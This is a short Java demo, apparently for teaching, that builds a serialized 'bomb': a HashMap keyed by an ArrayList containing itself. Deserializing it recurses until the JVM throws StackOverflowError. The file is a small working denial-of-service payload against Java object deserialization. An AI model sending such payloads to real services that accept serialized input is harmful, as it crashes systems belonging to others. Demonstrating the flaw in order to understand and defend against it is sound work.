/**
 * 
 */
package com.sssvt.deserialization.stackoverflow;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

/**
 * @author smamilla
 *
 */
public class StackOverflowExample {
	public static void main(String[] args) {
        System.out.println(bomb().length);
        deserialize(bomb());  // throws StackOverflow
        System.out.println("Done");
    }

    @SuppressWarnings({ "rawtypes", "unchecked" })
	static byte[] bomb() {
        HashMap map = new HashMap();
        List list = new ArrayList();
        map.put(list, "");
        list.add(list);
        return serialize(map);
    }

    public static byte[] serialize(Object o) {
        ByteArrayOutputStream ba = new ByteArrayOutputStream();
        try {
            new ObjectOutputStream(ba).writeObject(o);
        } catch (IOException e) {
            throw new IllegalArgumentException(e);
        }
        return ba.toByteArray();
    }


    public static Object deserialize(byte[] bytes) {
        try {
            return new ObjectInputStream(
                    new ByteArrayInputStream(bytes)).readObject();
        } catch (IOException | ClassNotFoundException e) {
            throw new IllegalArgumentException(e);
        }
    }
}